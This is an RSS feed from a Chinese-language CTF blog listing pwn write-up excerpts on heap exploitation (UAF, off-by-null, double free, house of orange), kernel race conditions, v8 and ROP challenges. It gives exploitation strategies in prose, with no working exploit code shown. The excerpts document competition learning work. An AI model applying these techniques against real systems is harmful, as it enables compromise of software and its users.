<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Write-Up on blog of chuj</title><link>https://chujdk.github.io/tags/write-up.html</link><description>Recent content in Write-Up on blog of chuj</description><generator>Hugo</generator><language>zh-cn</language><managingEditor>chujj31@gmail.com (chuj)</managingEditor><webMaster>chujj31@gmail.com (chuj)</webMaster><copyright>© chuj</copyright><lastBuildDate>Fri, 31 Mar 2023 19:59:00 +0000</lastBuildDate><atom:link href="https://chujdk.github.io/tags/write-up/index.xml" rel="self" type="application/rss+xml"/><item><title>XCTF-Final-hole-wp</title><link>https://chujdk.github.io/wp/1664.html</link><pubDate>Fri, 31 Mar 2023 19:59:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1664.html</guid><description>&lt;p>这次的 XCTF Final 总长 12 小时，有三道 pwn 题，一道为 Haskell 写成的 lisp 解释器，一道与 Intel sgx 有关。不过我都没怎么看，而是一直在看 hole 这道 v8 题。v8 一直在高速发展，由于我许久没有接触过了，所以不了解新的利用套路——即在构造了 &lt;code>addressOf&lt;/code> 和 &lt;code>fakeObject&lt;/code> 这两个原语后怎么实现 RCE。最后很遗憾，虽然我实现了上述的两个原语，但是最后并没有做出这题。以下是正文，简述了如何实现 hole 对象的 leak 并且完成对上述原语的构造。&lt;del>之后的利用我从解出的大佬那里求来了 exp，等我学会就找时间更新&lt;/del>更新：现在我会了，在文章里面简述了一下。&lt;/p></description></item><item><title>RCTF2021-musl-WP &amp;&amp; 5space 2021 *CTF 2022 强网杯 2022 Musl 赛题 exp</title><link>https://chujdk.github.io/wp/1549.html</link><pubDate>Mon, 13 Sep 2021 11:19:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1549.html</guid><description>&lt;h1 id="写在一年后">写在一年后&lt;/h1>
&lt;p>在现在向前看，发现自己也算半个 musl 大师了，自从 RCTF2021 的 musl 题之后的每场比赛只要出现 musl 我都能解出，也从最开始的写一天到现在的两三个小时打通，有时候还能拿个N血。这是什么原因呢？很简单，每道题都是换汤不换药，都是同样的攻击点，也就是 dequeue 操作，堆风水上稍稍有些区别，但也差不多，然后再开个 seccomp 恶心选手。很没有意思啦。还是希望 CTF 比赛不要盲目追求难度（特指的是各种严苛的而又重复的堆利用）能少出现一些重复的套路题，多一些有意思的题目。&lt;/p></description></item><item><title>InCTF2021-Ancienthouse/NodeKeeper-WP</title><link>https://chujdk.github.io/wp/1537.html</link><pubDate>Mon, 16 Aug 2021 11:55:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1537.html</guid><description>&lt;h2 id="ancienthouse">Ancienthouse&lt;/h2>
&lt;p>这道题用了 2.2.5 版本 jemalloc 作为分配器，而不是传统的 ptmalloc。jemalloc 是 Facebook 开发的一个分配器，在 Firefox 和 redis 中都有应用。据说比 ptmalloc 有更好的性能，特别是在多线程下的表现非常优秀。我也是第一次听说这个东西，为了解题简单地了解了一下。在 csdn 上看到&lt;a href="https://blog.csdn.net/txx_683/article/details/53468211">一个很棒的系列&lt;/a>，如果有兴趣跟着这些文章结合源码就可以理解的比较清楚了。我这里不再细讲，只说和题目相关的。&lt;/p></description></item><item><title>RaRCTF-PWN-WP</title><link>https://chujdk.github.io/wp/1532.html</link><pubDate>Tue, 10 Aug 2021 10:49:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1532.html</guid><description>&lt;p>一场非常温暖人心的比赛，pwn 题比较简单，也是第一次在比赛里做完了 pwn 题。题目虽然挺简单，但是挺有意思的。做的虽然很累，但是体验尚可。&lt;/p>
&lt;h3 id="archer">Archer&lt;/h3>
&lt;p>这题直接 nc 就可以了&lt;/p></description></item><item><title>TCTF2021-uc_masteeer-WP</title><link>https://chujdk.github.io/wp/1515.html</link><pubDate>Wed, 04 Aug 2021 12:24:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1515.html</guid><description>&lt;p>一道 Unicorn 的题目，之前没听说过这种东西，比赛的时候看都没看，现在来学习复现一下。&lt;/p>
&lt;p>关于 unicorn，在看雪上有一篇 &lt;a href="https://bbs.pediy.com/thread-253868.htm">Unicorn 在 Android 的应用&lt;/a> 写的很详细，这里参考该文章简单介绍一下。&lt;/p></description></item><item><title>DASCTF July X CBCTF 4th PWN WP</title><link>https://chujdk.github.io/wp/1508.html</link><pubDate>Mon, 02 Aug 2021 22:13:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1508.html</guid><description>&lt;p>周末打了一下 DASCTF July X CBCTF 4th 这场比赛，其实这段时间也有一个什么极客巅峰的比赛，还有一个 UIUCTF。极客巅峰错过报名了（以为是晚上十点截止），再加上决赛似乎主要是渗透测试相关的，本来也不是很相关。UIUCTF 感觉质量还挺高的，后来看好像还有专门的 kernel 题，正好这段时间学 kernel 其实挺值得打一下的，但是打完了 DASCTF 才发现有这比赛，所以也错过了。&lt;/p></description></item><item><title>Balsn_CTF_2019-KrazyNote-WP</title><link>https://chujdk.github.io/wp/1480.html</link><pubDate>Mon, 19 Jul 2021 20:57:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1480.html</guid><description>&lt;p>这道题的利用难度其实比较低，主要的难度在逆向上。说实话，乱七八糟的反编译代码是把我绕惨了。最近这段时间碰到了不少题目都是败在逆向上，我也意识到有必要提高一下逆向水平。&lt;/p></description></item><item><title>Jarvis OJ-HTTP-WP</title><link>https://chujdk.github.io/wp/1477.html</link><pubDate>Sun, 18 Jul 2021 22:27:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1477.html</guid><description>&lt;p>最开始的时候我也是想成为一个 web 手的，但是在入门的时候就被绊倒在了门槛上。近期参与的比赛中有碰到 http 服务器后门相关的 pwn 题，看起来属于难度比较低的题目，但是由于我对这个东西没有任何了解，就完全不会做，比较可惜，所以我觉得还是有必要了解一下相关的东西，所以就挑了这一道入门题来做一下。&lt;/p></description></item><item><title>QWB2021-notebook-WP</title><link>https://chujdk.github.io/wp/1468.html</link><pubDate>Thu, 15 Jul 2021 23:16:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1468.html</guid><description>&lt;p>强网杯的时候我还一点都不会 kernel pwn，这道题看都没看。这两天尝试复现了一下，从前天下午一直弄到现在才搞出来，费了不少时间，也学到了一些东西，特别地，学习到了之前学习 userfaultfd 和 tty attack 时一些自己不知道自己不知道的知识（这里没有打错哦 ^_^）。&lt;/p></description></item><item><title>D^3CTF2019-knote-WP</title><link>https://chujdk.github.io/wp/1455.html</link><pubDate>Tue, 13 Jul 2021 17:50:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1455.html</guid><description>&lt;p>本博客的第 200 篇文章，[font color=&amp;quot;#FA8072&amp;quot;] cheer! [/font]&lt;/p>
&lt;p>这道题是老学长 Aris 出的，借着这道题学习了一下用 userfaultfd 机制稳定条件竞争的方法。我确实还是比较菜，又是完全照着 ha1vk 师傅的文章&lt;a href="https://blog.csdn.net/seaaseesa/article/details/104650794?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-6.control&amp;amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-6.control">linux kernel pwn学习之条件竞争(二)userfaultfd&lt;/a>学习的。&lt;/p></description></item><item><title>WCTF2018-klist-WP</title><link>https://chujdk.github.io/wp/1446.html</link><pubDate>Mon, 12 Jul 2021 14:45:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1446.html</guid><description>&lt;p>本文参考自 ha1vk 师傅的&lt;a href="https://blog.csdn.net/seaaseesa/article/details/104649351?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162599917316780262521691%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;amp;request_id=162599917316780262521691&amp;amp;biz_id=0&amp;amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-104649351.first_rank_v2_pc_rank_v29&amp;amp;utm_term=linux+kernel+pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89&amp;amp;spm=1018.2226.3001.4187">linux kernel pwn学习之条件竞争(一)&lt;/a>&lt;/p>
&lt;p>借着这道题初步学习了一下 kernel 中条件竞争的利用。本题主要是通过条件竞争造成 UAF，然后通过 pipe_buffer 造成堆喷射实现提权。&lt;/p></description></item><item><title>PWNABLE.TW-Kidding-WP</title><link>https://chujdk.github.io/wp/1439.html</link><pubDate>Fri, 09 Jul 2021 21:28:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1439.html</guid><description>&lt;p>很久没碰过 pwnable 的题目了，这道题其实很久之前也做过了，但是当时没有服务器接反弹的 shell，所以就作罢了，今天新买了一台服务器，不需要在上面跑什么服务，所以把端口全部放开也没关系，就顺便做掉了这道题。&lt;/p></description></item><item><title>*CTF2019-hackme-WP</title><link>https://chujdk.github.io/wp/1433.html</link><pubDate>Thu, 08 Jul 2021 16:08:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1433.html</guid><description>&lt;p>首先看一下启动参数&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>qemu-system-x86_64 &lt;span style="color:#4070a0;font-weight:bold">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4070a0;font-weight:bold">&lt;/span> -m 256M &lt;span style="color:#4070a0;font-weight:bold">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4070a0;font-weight:bold">&lt;/span> -nographic &lt;span style="color:#4070a0;font-weight:bold">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4070a0;font-weight:bold">&lt;/span> -kernel bzImage &lt;span style="color:#4070a0;font-weight:bold">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4070a0;font-weight:bold">&lt;/span> -append &lt;span style="color:#4070a0">&amp;#39;console=ttyS0 loglevel=3 oops=panic panic=1 kaslr&amp;#39;&lt;/span> &lt;span style="color:#4070a0;font-weight:bold">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4070a0;font-weight:bold">&lt;/span> -monitor /dev/null &lt;span style="color:#4070a0;font-weight:bold">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4070a0;font-weight:bold">&lt;/span> -initrd initramfs.cpio &lt;span style="color:#4070a0;font-weight:bold">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4070a0;font-weight:bold">&lt;/span> -smp &lt;span style="color:#bb60d5">cores&lt;/span>&lt;span style="color:#666">=&lt;/span>4,threads&lt;span style="color:#666">=&lt;/span>&lt;span style="color:#40a070">2&lt;/span> &lt;span style="color:#4070a0;font-weight:bold">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4070a0;font-weight:bold">&lt;/span> -cpu qemu64,smep,smap 2&amp;gt;/dev/null
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>开启了 kaslr 和 smep，smap。&lt;/p>
&lt;p>这道题是一个堆上溢出造成的 UAF，具体的，在 0x30002 功能，也就是 edit 功能处&lt;/p></description></item><item><title>TCTF2021-listbook-WP</title><link>https://chujdk.github.io/wp/1431.html</link><pubDate>Mon, 05 Jul 2021 22:47:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1431.html</guid><description>&lt;p>比赛和考试周相撞，所以比赛没有好好打，整场只看了这道题，比较尴尬的是最后也没看出来漏洞点。这个漏洞点让我觉得这个位置一定是个漏洞点，但是又触发不了这个洞，最后看了别人的 WP 才知道洞的位置猜对了，但是比赛时不知道为什么没触发出来。&lt;/p></description></item><item><title>2021强网杯线上赛 baby_diary [强网先锋]orw babypwn WP</title><link>https://chujdk.github.io/wp/1399.html</link><pubDate>Sun, 13 Jun 2021 21:39:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1399.html</guid><description>&lt;p>强网杯这次我总共做了 3 道比较简单 pwn 题，还有三道题目学长做了，之后看情况复现一下。剩下 7 道基本上不会，还是需要继续学习&lt;/p>
&lt;h3 id="baby_diary">baby_diary&lt;/h3>
&lt;p>这道题就是 2.29+ libc 的 unlink 利用，详细的利用方法可以参见 &lt;a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/off-by-one/#libc-229">CTF-WIKI&lt;/a> 和这篇 &lt;a href="https://chujdk.github.io/WP/1290.html">WP&lt;/a>（无耻地推销一下，两篇都是我写的 ^_^）&lt;/p></description></item><item><title>XCTF-FINAL 2021-house of pig-WP</title><link>https://chujdk.github.io/wp/1362.html</link><pubDate>Tue, 01 Jun 2021 23:47:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1362.html</guid><description>&lt;p>感觉自己还是太菜了，在比赛期间甚至都没有逆清楚这道题，即使学长给了分析好的 idb 文件也看不懂。当然当时身体不是很好也有一部分原因，但是还是觉得很遗憾。比赛结束后复现了一下，也算是学习一下新的利用方法。&lt;/p></description></item><item><title>DASCTF2021.5-PWN-WP</title><link>https://chujdk.github.io/wp/1360.html</link><pubDate>Sun, 30 May 2021 15:16:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1360.html</guid><description>&lt;p>由于有 XCTF-FINAL，所以虽然报了名，但是并没有打这场比赛，XCTF 也是零贡献，什么都不会了只好补一下 DASCTF 的题目，两题都很简单。&lt;/p>
&lt;p>ticket 可以通过申请释放再申请可以 leak 出 libc 和堆的基址，然后输入在 age 变量处伪造一个 chunk 的地址，利用整数溢出 free 掉这个 chunk，实现 double free，打 malloc_hook 即可&lt;/p></description></item><item><title>bluehat2021-portable-WP</title><link>https://chujdk.github.io/wp/1357.html</link><pubDate>Thu, 27 May 2021 09:46:21 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1357.html</guid><description>&lt;p>很久之前打的比赛了，由于调试环境没配好，一直没复现这道题，前天突发奇想&lt;a href="https://chujdk.github.io/pwnreview/1353.html">手动编译了一下 qemu&lt;/a> 发现可以调了，所以就复现了一下&lt;/p>
&lt;p>主要的洞在&lt;/p>
&lt;div style="text-align:center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/05/3181759210.png
">&lt;/div>
&lt;p>这里的 switch 中，没有对 v1 进行范围检查，所以输入零就可以不更新 player 信息，实现 double free 和 leak。&lt;/p></description></item><item><title>CISCN2021-silverwolf-WP</title><link>https://chujdk.github.io/wp/1333.html</link><pubDate>Wed, 19 May 2021 16:18:56 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1333.html</guid><description>&lt;p>这次 CISCN 可以说是没参赛，只做了分数最低的 pwny，最后 realloc 调 one_gadget 栈的工作也不是我做的（一方面嫌烦另一方面刚准备调学长已经把 exp 写好了）。那题其实就是个脑洞题，没什么难度。channel 还没看，大概就是一个 UAF 和 arm 加 qemu-user 运行免去 leak 的题，之后看心情复现一下吧（arm 的调试仍然不是很会，还需要多学习）。&lt;/p></description></item><item><title>XCTF 津门杯 2021-PwnCTFM-WP</title><link>https://chujdk.github.io/wp/1317.html</link><pubDate>Tue, 11 May 2021 21:06:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1317.html</guid><description>&lt;p>比赛的时候不知道为什么，一直没想出来，赛后复现一下。&lt;/p>
&lt;p>本题、本次比赛，最讨厌的地方就是每道 PWN 题都没给 libc，大幅降低了做题体验（好吧还是我太菜了）。其实题目很简单。&lt;/p></description></item><item><title>Bluehat2021-slient-WP</title><link>https://chujdk.github.io/wp/1302.html</link><pubDate>Thu, 29 Apr 2021 16:28:44 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1302.html</guid><description>&lt;p>这题没啥意思，就是爆破。由于无法输出任何东西，需要有能代表是正确的标志，可以使用 jmp 0 的方法，如果爆破正确则 jmp 0，否则 jmp 到一个乱七八糟的地方造成段错误，这样通过是否有 got eof 就可以判断了。&lt;/p></description></item><item><title>PWNABLE.TW-BREAK OUT-WP</title><link>https://chujdk.github.io/wp/1301.html</link><pubDate>Tue, 27 Apr 2021 21:05:54 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1301.html</guid><description>&lt;p>这道题还是比较刺激的，一开始觉得很简单，直接改 note 指针修改 __free_hook 就行了，结果发现开启了写地址白名单，只允许在堆段上写数据，于是考虑 unsorted bin attack 改白名单，然后无语地发现白名单只读，于是只能 FSOP，然后本机和服务器的堆环境还不一样（明明是一样的 libc），打出了整个堆段分析才找到正确的地址。&lt;/p></description></item><item><title>XCTF-sentosa-WP</title><link>https://chujdk.github.io/wp/1298.html</link><pubDate>Sat, 24 Apr 2021 16:19:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1298.html</guid><description>&lt;p>主要的漏洞点在&lt;/p>
&lt;div style="text-align:center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/04/2595649257.png
">&lt;/div>
&lt;p>这里，当 &lt;code>Input length of your project name:&lt;/code> 时输入 0，此处 v2 就会变成 -1，可以栈溢出。&lt;/p>
&lt;p>栈环境如下&lt;/p>
&lt;div style="text-align:center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/04/60487650.png
">&lt;/div>
&lt;p>由于有 canary，有意义的溢出也仅有溢出到 v6。&lt;/p>
&lt;div style="text-align:center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/04/1818695994.png
">&lt;/div>
&lt;p>v6 仅在最后被存入到了指针数组中，又没有 edit 功能，所以我们只能通过部分覆写来实现 leak 和 free。&lt;/p></description></item><item><title>Balsn_CTF_2019-PlainText-WP</title><link>https://chujdk.github.io/wp/1290.html</link><pubDate>Thu, 22 Apr 2021 14:41:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1290.html</guid><description>&lt;p>这道题确实是比较难，卡了很多天，又花了很久才复现出来。&lt;/p>
&lt;h3 id="漏洞点分析">漏洞点分析&lt;/h3>
&lt;p>程序的流程比较清晰简单，在 add 函数中，存在明显的 off-by-null。&lt;/p>
&lt;div style="text-align:center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/04/1746808602.png
">&lt;/div>
&lt;p>而 free 中对被 free 的指针进行了置空，导致无法直接 show，而程序对我们的输入末尾附加 &lt;code>\x00&lt;/code>，也无法使用释放再申请的方法，leak 比较困难。&lt;/p></description></item><item><title>PlaidCTF2021-Plaidflix-WP</title><link>https://chujdk.github.io/wp/1289.html</link><pubDate>Mon, 19 Apr 2021 08:55:41 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1289.html</guid><description>&lt;p>周末两天都在打这个比赛，毕竟是高质量的国际赛，难度确实是有点大，我也只做出了这道比较传统并且简单的题目。&lt;/p>
&lt;p>首先是程序的逆向，不知道对 binary 做了什么处理，反正用 IDA 分析乱的一塌糊涂，但是和动调结合还是可以理解清楚程序的功能的。总体来讲在 manage movie 和 manage friend 中仅有一个 share movie with friend 这个功能存在有限的 UAF，也就是通过先分享电影给朋友，然后删掉朋友，仍然是可以输出朋友的信息的，通过这样的方法可以 leak 出堆地址和 libc 地址。比较坑爹的是，在靶机使用的 libc 下，main_arena + 0x60 的偏移的最低一字节正好是 \x00，无法输出。但是由于可以申请大小为 \x90 的 chunk，所以可以通过把 unsorted bin 压入 small bin 的方法来 leak。&lt;/p></description></item><item><title>BUU-[OGeek2019 Final]OVM-WP</title><link>https://chujdk.github.io/wp/1287.html</link><pubDate>Thu, 15 Apr 2021 22:20:31 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1287.html</guid><description>&lt;p>做的第二道虚拟机类题，此题还算比较简单，因为程序结构很清晰，也贴心的给出了调试信息，可以比较容易读懂程序。读懂程序之后找到漏洞点，利用就比较简单了。&lt;/p></description></item><item><title>BUU-ciscn_2019_qual_virtual-WP</title><link>https://chujdk.github.io/wp/1270.html</link><pubDate>Wed, 14 Apr 2021 21:58:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1270.html</guid><description>&lt;p>一道虚拟机 pwn 题，大概是最入门的级别的了，也是此类题型我做的第一道，感觉主要的难点在逆向而非利用，理解程序行为和发现漏洞点后就不难做出了。&lt;/p>
&lt;h3 id="逆向分析">逆向分析&lt;/h3>
&lt;p>此程序模拟了一个数据段，一个代码段和一个栈段&lt;/p></description></item><item><title>hitcon_ctf_2019_lazyhouse-WP</title><link>https://chujdk.github.io/wp/1269.html</link><pubDate>Tue, 13 Apr 2021 23:26:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1269.html</guid><description>&lt;p>hitcon 的题目还是非常有质量且紧跟时代潮流的，在 2019 年连出两道和 libc 2.29 相关的堆利用题，一题是 &lt;a href="https://buuoj.cn/challenges#hitcon_ctf_2019_one_punch">one_punch&lt;/a>，&lt;a href="https://chujdk.github.io/WP/1226.html">我的 WP&lt;/a>，另一题就是就是本题，我并未在网络上找到环境，题目的二进制文件和 libc 可以在&lt;a href="https://github.com/pr0cf5/CTF-writeups/tree/master/2019/hitcon/lazyhouse">这里&lt;/a>下载。Angel Boy 的题目自然质量有保证，我做了半天多才整出来。我使用的方法是所谓的 &lt;code>Tcache stash unlink attack+&lt;/code>，在网络上并没有找到详细的同方法 WP，所以我这一篇就写的详细一些。&lt;/p></description></item><item><title>PWNABLE.TW-Printable-WP</title><link>https://chujdk.github.io/wp/1265.html</link><pubDate>Mon, 12 Apr 2021 22:17:29 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1265.html</guid><description>&lt;p>相当麻烦的格式化字符串和 .fini 数组利用结合的题目，由于是 pwnable 的题，这里只简单记录一下思路&lt;/p>
&lt;p>首先，printf 是很裸的，但是执行完后就会直接 exit，这肯定不行，首要的是要做到能够重复利用。exit 在执行时，会遍历 .fini 数组中的所有函数并执行。程序没有开启 PIE，自然会想到修改 .fini 数组，但是该数组不可写，就需要用别的方法。在调用 .fini 数组中的函数的 _dl_fini 中有这样一段代码&lt;/p></description></item><item><title>PWNABLE.TW-seethefile-WP</title><link>https://chujdk.github.io/wp/1253.html</link><pubDate>Tue, 06 Apr 2021 14:46:38 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1253.html</guid><description>&lt;p>首先是前置的小 trick：&lt;a href="https://chujdk.github.io/pwnreview/1070.html">关于/proc目录&lt;/a>&lt;/p>
&lt;p>题目提供了读取文件的功能，可以读除了 flag 之外的文件。自然可以想到通过 &lt;code>/proc/self/maps&lt;/code> 来 leak 出 libc 的基地址。&lt;/p>
&lt;p>然后在退出时&lt;/p>
&lt;div style="text-align:center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/04/1527643670.png">&lt;/div>
&lt;p>注意到这里有一个 &lt;code>&amp;quot;%s&amp;quot;&lt;/code> 可以溢出。一开始也没仔细看，以为 name 是栈上的变量，也没看到后面的 &lt;code>exit(0)&lt;/code>，准备 rop，结果发现 name 在 .bss 段上，难以 rop，但是注意到 fp 变量在 name 后面，所以可以通过溢出覆写 fp。程序没有开启 PIE，所以我们写入的地址是已知的，我们布置好一个 fake_file，让 fp 指向它，在执行 fclose 的时候 getshell 了。&lt;/p></description></item><item><title>PWNABLE.TW-Secret Garden-WP</title><link>https://chujdk.github.io/wp/1250.html</link><pubDate>Sun, 04 Apr 2021 11:28:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1250.html</guid><description>&lt;p>这道题其实很简单，就是 unsorted bin 的 leak 加上一个 house of spirit，我 pwn 它可能主要还是为了减轻不做题的罪恶感。&lt;/p>
&lt;div style="text-align:center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/04/2750360037.png
">&lt;/div>
&lt;p>visit 这个功能可以输出，我们只要释放一个 unsorted bin，再申请一个大小为 0 的堆块就可以 leak 出 main_arena，从而算出 libc 基址（关于 unsorted bin 的 leak 原理可见我的&lt;a href="https://chujdk.github.io/pwnreview/1089.html">这篇文章&lt;/a>）。&lt;/p></description></item><item><title>PWNABLE.TW-secret_of_my_heart-WP</title><link>https://chujdk.github.io/wp/1241.html</link><pubDate>Thu, 01 Apr 2021 23:47:03 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1241.html</guid><description>&lt;p>一道堆题，主要的漏洞点是 off-by-one。&lt;/p>
&lt;div style="text-align:center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/04/2590516278.png
">&lt;/div>
&lt;p>可见这里会在读入的字符串末尾加零，那么只要我们申请形如 0x18 的大小的空间，写入 0x18 个字符，就可以溢出一个字节，将下一个 chunk 的 size 域的 prev_inuse 位置零，然后把下一个 chunk free 掉，两个 chunk就可以合并。&lt;/p></description></item><item><title>PWNABLE.TW-unexploitable-WP</title><link>https://chujdk.github.io/wp/1232.html</link><pubDate>Wed, 31 Mar 2021 20:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1232.html</guid><description>&lt;p>此题是一个 rop，分数挺高，难度不大。&lt;/p>
&lt;blockquote>
&lt;p>The original challenge is on pwnable.kr and it is solvable.&lt;/p>
&lt;p>This time we fix the vulnerability and now we promise that the service is unexploitable.&lt;/p>&lt;/blockquote>
&lt;p>题目描述是这样的，&lt;a href="pwnable.kr">pwnable.kr&lt;/a> 没刷过，也不知道原题是什么，反正先 IDA 里面看一下再说&lt;/p></description></item><item><title>PWNABLE.TW-De-ASLR-WP</title><link>https://chujdk.github.io/wp/1227.html</link><pubDate>Tue, 30 Mar 2021 14:53:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1227.html</guid><description>&lt;p>这个 ROP 非常的麻烦&lt;/p>
&lt;h3 id="分析">分析&lt;/h3>
&lt;p>流程就两句话&lt;/p>
&lt;div style="text-align:center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/03/3937036548.png
">&lt;/div>
&lt;p>看起来似乎非常的简单，就是一个 gets 造成的无限溢出。但是并没有任何输出函数，所以 leak 非常困难。&lt;/p>
&lt;h3 id="思路">思路&lt;/h3>
&lt;p>没有任何的 libc 地址，想要 leak 只能用栈上的残留数据，程序没有开启 PIE，所以我们可以通过栈迁移将栈迁移至地址固定的段上，比如进程末尾的可读可写页。然后在此处执行一个 gets，就可以把一些 libc 的地址留在这里了。&lt;/p></description></item><item><title>BUU-hitcon_ctf_2019_one_punch-WP</title><link>https://chujdk.github.io/wp/1226.html</link><pubDate>Sun, 28 Mar 2021 16:49:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1226.html</guid><description>&lt;p>许久没做题了，今天花了半天的时间学习了一下 &lt;strong>Tcache stash unlink attack&lt;/strong> 这种利用方式，做了一下 hitcon 的这道题。&lt;/p>
&lt;p>其实第一次碰到这道题是在 hctf-game final 的时候，语神给这道题套了一个 php 的壳当成 webpwn 出了出来，当时由于不知道该怎么 leak（由于外面套了一层 php，内部堆的结构非常混乱而且易变）就没有做出来。一直没有复现，解一下这题也就当复现了吧。&lt;/p></description></item><item><title>XCTF-shaxian-WP</title><link>https://chujdk.github.io/wp/1221.html</link><pubDate>Fri, 26 Mar 2021 17:21:50 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1221.html</guid><description>&lt;p>这道题做出的人很少，本来以为很难，结果一点都不难，但是打不通远程，不出意外应该是靶机的问题。因为本机可以打通，但是远程打不通，为了证明特意去网上找了一些 wp 中的 exp，发现也打不通，主要是因为找不到正确版本的 libc，第二次碰到这种情况，XCTF 平台还是有点不厚道啊。&lt;/p></description></item><item><title>PWNABLE.TW-BookWriter-WP</title><link>https://chujdk.github.io/wp/1217.html</link><pubDate>Wed, 24 Mar 2021 18:53:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1217.html</guid><description>&lt;p>这是一道 house of orange，总体比较明显，比较模板化，但是有一处溢出点藏得比较深。&lt;/p>
&lt;h3 id="漏洞点">漏洞点&lt;/h3>
&lt;div style="text-align:center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/03/4238122124.png
">&lt;/div>
